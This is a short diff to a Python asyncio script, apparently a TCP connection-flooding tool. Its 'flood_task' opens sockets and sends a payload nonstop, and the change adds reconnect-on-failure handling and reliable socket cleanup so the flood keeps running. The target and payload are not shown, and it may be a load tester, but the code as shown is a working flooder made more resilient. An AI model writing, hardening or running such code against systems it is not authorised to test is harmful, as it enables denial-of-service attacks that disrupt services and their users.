@@ -19,6 +19,7 @@ async def flood_task(stop):
     global bytes_sent, connections, errors
     loop = asyncio.get_running_loop()
     while not stop.is_set():
+        s = None
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -28,14 +29,19 @@ async def flood_task(stop):
             async with lock:
                 connections += 1
             while not stop.is_set():
-                await loop.sock_sendall(s, PAYLOAD)
-                async with lock:
-                    bytes_sent += len(PAYLOAD)
+                try:
+                    await loop.sock_sendall(s, PAYLOAD)
+                    async with lock:
+                        bytes_sent += len(PAYLOAD)
+                except:
+                    break  # connection died, reconnect
         except:
             async with lock:
                 errors += 1
-            try: s.close()
-            except: pass
+        finally:
+            if s:
+                try: s.close()
+                except: pass
 
 async def monitor(stop, start, tasks):
     while not stop.is_set():
